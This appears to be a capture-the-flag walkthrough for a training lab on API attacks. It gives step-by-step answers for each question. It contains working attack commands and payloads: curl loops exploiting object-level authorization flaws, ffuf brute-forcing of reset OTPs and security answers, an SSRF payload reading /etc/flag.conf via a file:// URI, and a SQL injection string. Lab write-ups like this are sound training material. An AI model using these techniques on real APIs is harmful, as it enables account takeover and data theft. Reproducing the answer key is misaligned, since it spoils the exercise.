# API Attack

### Question 1

**Interact with any endpoint and inspect the response headers; what is the name of the server that the web API uses?**

**Steps:**

1. Visit the Swagger UI.

   * `http://<TARGET-IP>:<PORT>/swagger`
2. Open Developer Tools (F12).
3. Go to **Network** → select any request → **Headers** tab.
4. Inspect the `Server` response header.

---

### Question 2

**Exploit another Broken Object Level Authorization vulnerability and submit the flag.**

**Steps:**

1. Authenticate as a supplier:

   * Endpoint: `/api/v1/authentication/suppliers/sign-in`

   ```json
   {
     "Email": "<REDACTED>@pentestercompany.com",
     "Password": "<REDACTED>"
   }
   ```
2. Copy the JWT from the response body.
3. Click **Authorize** in Swagger and submit the token.
4. Visit `/api/v1/suppliers/current-user` → Execute.
5. Enumerate roles:

   ```bash
   for i in {1..50}; do
     curl -s -H "Authorization: Bearer <REDACTED>" \
     http://<TARGET-IP>:<PORT>/api/v1/roles/current-user
   done
   ```
6. Note access to quarterly reports.
7. Exploit IDOR on quarterly reports:

   ```bash
   for i in {1..50}; do
     curl -s -X GET \
     "http://<TARGET-IP>:<PORT>/api/v1/suppliers/quarterly-reports/$i" \
     -H 'accept: application/json' \
     -H 'Authorization: Bearer <REDACTED>' | jq | grep "HTB"
   done
   ```
8. Retrieve the flag from the response.

---

### Question 3

**Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email '<REDACTED>'. Retrieve their payment options data and submit the flag.**

**Steps:**

1. Trigger password reset OTP:

   ```bash
   curl -s -X POST 'http://<TARGET-IP>:<PORT>/api/v1/authentication/customers/passwords/resets/email-otps' \
   -H 'Content-Type: application/json' \
   -d '{"Email":"<REDACTED>"}'
   ```
2. Brute-force the OTP:

   ```bash
   ffuf -u 'http://<TARGET-IP>:<PORT>/api/v1/authentication/customers/passwords/resets' \
   -X POST \
   -H 'Content-Type: application/json' \
   -d '{"Email":"<REDACTED>","OTP":"FUZZ","NewPassword":"password"}' \
   -w <(seq -w 0000 9999) \
   -fs 23 -t 50
   ```
3. Reset the password using the valid OTP.
4. Authenticate via `/api/v1/authentication/customers/sign-in` and obtain a JWT.
5. Access payment options:

   * `/api/v1/customers/payment-options/current-user`
6. Extract the flag.

---

### Question 4

**Exploit another Excessive Data Exposure vulnerability and submit the flag.**

**Scenario 1:**

1. Authenticate as supplier user → obtain JWT.
2. Access:

   * `GET /api/v1/supplier-companies`
3. Identify excessive data exposure and retrieve the flag.

**Scenario 2:**

1. Authenticate as a customer user → obtain JWT.
2. Create an order:

   * `POST /api/v1/customers/orders`
3. Copy the `OrderID`.
4. Retrieve product IDs:

   * `GET /api/v1/product`
5. Add item to order:

   ```json
   {
     "OrderID": "<REDACTED>",
     "OrderItems": [
       {
         "ProductID": "<REDACTED>",
         "Quantity": 1,
         "NetSum": 0.01
       }
     ]
   }
   ```
6. Execute and retrieve the flag.

---

### Question 5

**Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.**

**Steps:**

1. Focus on:

   * `POST /api/v1/authentication/customers/passwords/resets/sms-otps`
2. Send the request repeatedly:

   ```json
   {
     "Email": "<REDACTED>@hackthebox.com"
   }
   ```
3. Observe the response body after multiple requests.
4. Extract the flag.

---

### Question 6

**Exploit another Broken Function Level Authorization vulnerability and submit the flag.**

**Steps:**

1. Access:

   * `GET /api/v1/customers/billing-addresses`
2. Copy the generated curl request.
3. Execute with a valid JWT:

   ```bash
   curl -X GET \
   'http://<TARGET-IP>:<PORT>/api/v1/customers/billing-addresses' \
   -H 'accept: application/json' \
   -H 'Authorization: Bearer <REDACTED>' | grep "HTB"
   ```
4. Retrieve the flag.

---

### Question 7

**Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the given ID lives.**

**Steps:**

1. Reuse the billing addresses endpoint.
2. Filter by user ID:

   ```bash
   curl -s \
   'http://<TARGET-IP>:<PORT>/api/v1/customers/billing-addresses' \
   -H 'Authorization: Bearer <REDACTED>' | grep '<REDACTED-USER-ID>'
   ```
3. Identify the street address from the response.

---

### Question 8

**Exploit another Server-Side Request Forgery vulnerability and submit the contents of the file `/etc/flag.conf`.**

**Steps:**

1. Create a product:

   ```json
   {
     "NewProduct": {
       "Name": "Hacking",
       "Price": 6,
       "PNGPhotoFileURI": "file:///etc/flag.conf"
     }
   }
   ```
2. Upload any image via `POST /api/v1/products/photo`.
3. Update the product:

   ```json
   {
     "UpdatedProduct": {
       "ProductID": "<REDACTED>",
       "Name": "Hacking",
       "Price": 6,
       "PNGPhotoFileURI": "file:///etc/flag.conf"
     }
   }
   ```
4. Retrieve the image:

   * `GET /api/v1/products/{id}/photo`
5. Decode Base64 data using CyberChef.
6. Extract the flag.

---

### Question 9

**Exploit another Security Misconfiguration and provide the total count of records within the target table.**

**Steps:**

1. Access:

   * `/api/v1/suppliers/{name}/count`
2. Inject payload:

   ```
   ' OR 1==1 --
   ```
3. Observe CORS misconfiguration:

   * `Access-Control-Allow-Origin: *`
4. Retrieve the total record count.

---

### Question 10

**Exploit the Improper Inventory Management vulnerability and submit the value of the `Email` field from the deleted Supplier Company.**

**Steps:**

```bash
curl -X GET \
'http://<TARGET-IP>:<PORT>/api/v0/supplier-companies/deleted' \
-H 'accept: application/json' | grep "Email"
```

---

### Question 11

**If v1 accepted data unsafely, what would the password hash of the specified user be?**

**Steps:**

```bash
curl -X GET \
'http://<TARGET-IP>:<PORT>/api/v0/suppliers/deleted' \
-H 'accept: application/json' | grep '<REDACTED-NAME>'
```

---

### Question 12

**Security Question Reset Abuse**

**Steps:**

1. Obtain a color wordlist.
2. Brute-force security question answers:

   ```bash
   ffuf -t 50 -X POST \
   -u 'http://<TARGET-IP>:<PORT>/api/v2/authentication/suppliers/passwords/resets/security-question-answers' \
   -H 'Content-Type: application/json' \
   -d '{"SupplierEmail":"EMAIL","SecurityQuestionAnswer":"COLOR","NewPassword":"password"}' \
   -w colors.txt:COLOR -w emails.txt:EMAIL \
   -fs 23
   ```
3. Authenticate with the reset credentials.
4. Update supplier profile with file URI injection.
5. Retrieve CV:

   * `GET /api/v2/suppliers/current-user/cv`
6. Decode Base64 data using CyberChef.
7. Extract the flag.

